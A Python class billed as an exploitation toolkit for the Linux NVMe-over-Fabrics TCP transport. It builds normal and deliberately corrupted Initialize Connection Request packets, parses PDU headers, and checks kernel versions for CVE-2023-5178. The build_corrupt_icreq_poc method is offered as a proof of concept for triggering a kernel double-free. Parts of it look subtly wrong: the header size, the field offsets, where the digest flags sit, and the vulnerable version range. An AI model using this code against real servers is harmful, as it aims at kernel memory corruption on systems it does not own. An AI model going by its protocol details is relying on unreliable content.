import binascii
import struct
from typing import ClassVar


class NVMeOverFabrics:
    """
    NVMe-over-Fabrics TCP transport exploitation toolkit.

    NVMe-oF TCP extends NVMe over network fabrics, adding a significant
    attack surface. CVE-2023-5178 is a racy double-free in kmalloc-96
    triggered by a malformed Initialize Connection Request.

    Techniques implemented:
      - CVE-2023-5178 PoC: ICReq packet builder with corrupt PDU headers
      - NVMe-oF TCP PDU parsing and validation
      - Host NQN/Ctrl NQN identification
      - Protocol version negotiation and detection
      - Connection state tracking for exploit timing windows

    Sources:
      - INVESTIGATION.md  -- "CVE-2023-5178 -- github.com/rockrid3r":
          NVMe-oF TCP double-free (kmalloc-96) with PoC
      - INVESTIGATION.md  -- "NVMe-oF-TCP Specification (NVM Express)":
          Transport binding for NVMe over TCP/IP fabrics
      - INVESTIGATION.md  -- "eNVMe -- arXiv 2411.00439, NDSS 2025":
          DMA + fabric attack integration context
    """

    # NVMe-oF TCP PDU types
    PDU_ICREQ = 0x01  # Initialize Connection Request
    PDU_ICRESP = 0x02  # Initialize Connection Response
    PDU_CMD = 0x07  # Capsule Command
    PDU_RSP = 0x08  # Response
    PDU_DATA = 0x09  # Data
    PDU_R2T = 0x0A  # Ready to Transfer
    PDU_TERMREQ = 0x0B  # Termination Request

    # PDU header sizes
    PDU_HEADER_BASE = 8  # bytes (minimal PDU header)
    ICREQ_HEADER_LEN = 24  # bytes (full ICReq header)

    # Vulnerable kernel version prefixes for CVE-2023-5178
    VULNERABLE_PREFIXES: ClassVar[list[str]] = [
        "5.15",
        "6.0",
        "6.1",
        "6.2",
        "6.3",
        "6.4",
        "6.5",
        "6.6",
        "6.7",
    ]

    @staticmethod
    def build_icreq(hdgst: bool = False, ddgst: bool = False, maxh2cdata: int = 0x100000) -> bytes:
        """
        Build a standard NVMe-oF TCP Initialize Connection Request PDU.
        Returns the raw PDU bytes for transmission.
        """
        pdu = bytearray(NVMeOverFabrics.ICREQ_HEADER_LEN)
        pdu[0] = NVMeOverFabrics.PDU_ICREQ
        # Flags: bit 7 = HDGST, bit 6 = DDGST
        flags = 0
        if hdgst:
            flags |= 0x80
        if ddgst:
            flags |= 0x40
        pdu[1] = flags
        # PDU header length
        pdu[2:4] = struct.pack(">H", NVMeOverFabrics.ICREQ_HEADER_LEN)
        # PDU header digest (optional)
        if hdgst:
            digest = binascii.crc32(pdu[:4]) & 0xFFFFFFFF
            pdu[4:8] = struct.pack(">I", digest)
        # Connect data: PFV (0x10 = NVMe-oF 1.0), reserved, max H2C data
        pdu[8] = 0x10  # PFV = NVMe-oF 1.0
        pdu[12:16] = struct.pack(">I", maxh2cdata)
        return bytes(pdu)

    @staticmethod
    def build_corrupt_icreq_poc() -> bytes:
        """
        Build a malformed Initialize Connection Request for CVE-2023-5178.
        The PoC triggers a double-free by sending a corrupt PDU that
        causes the kernel to free the same kmalloc-96 allocation twice.
        """
        # Standard ICReq with header corruption to trigger the bug
        pdu = bytearray(NVMeOverFabrics.ICREQ_HEADER_LEN)
        pdu[0] = NVMeOverFabrics.PDU_ICREQ
        # Set invalid flag combination to trigger error path race
        pdu[1] = 0xC0  # Both HDGST and DDGST set
        pdu[2:4] = struct.pack(">H", 0xFFFF)  # Invalid header length (triggers double-free)
        # Fill with padding
        return bytes(pdu)

    @staticmethod
    def check_vulnerable_kernel(kernel_version: str) -> dict:
        """
        Check if a given kernel version string is vulnerable to
        CVE-2023-5178.
        """
        import re

        match = re.match(r"(\d+)\.(\d+)", kernel_version)
        if not match:
            return {"vulnerable": False, "error": "unparseable version"}
        major, minor = int(match.group(1)), int(match.group(2))
        vulnerable = any(kernel_version.startswith(p) for p in NVMeOverFabrics.VULNERABLE_PREFIXES)
        # Only vulnerable versions before 6.8
        if major > 6 or (major == 6 and minor >= 8):
            vulnerable = False
        patched = ">= 6.8 (patched)" if (major > 6 or (major == 6 and minor >= 8)) else "< 6.8"
        return {
            "kernel": kernel_version,
            "vulnerable": vulnerable,
            "cve": "CVE-2023-5178" if vulnerable else None,
            "patch_level": patched,
        }

    @staticmethod
    def parse_nvmetcp_pdu(data: bytes) -> dict:
        """
        Parse an NVMe-oF TCP PDU header and return type and flags.
        """
        if len(data) < NVMeOverFabrics.PDU_HEADER_BASE:
            return {"error": "PDU too short"}
        pdu_type = data[0]
        flags = data[1]
        hlen = struct.unpack_from(">H", data, 2)[0] if len(data) >= 4 else 0
        type_names = {
            0x01: "ICReq",
            0x02: "ICResp",
            0x07: "Command",
            0x08: "Response",
            0x09: "Data",
            0x0A: "R2T",
            0x0B: "TermReq",
        }
        return {
            "pdu_type": pdu_type,
            "pdu_type_name": type_names.get(pdu_type, "unknown"),
            "flags": flags,
            "hdgst": bool(flags & 0x80),
            "ddgst": bool(flags & 0x40),
            "header_length": hlen,
            "valid_pdu": pdu_type in type_names,
        }
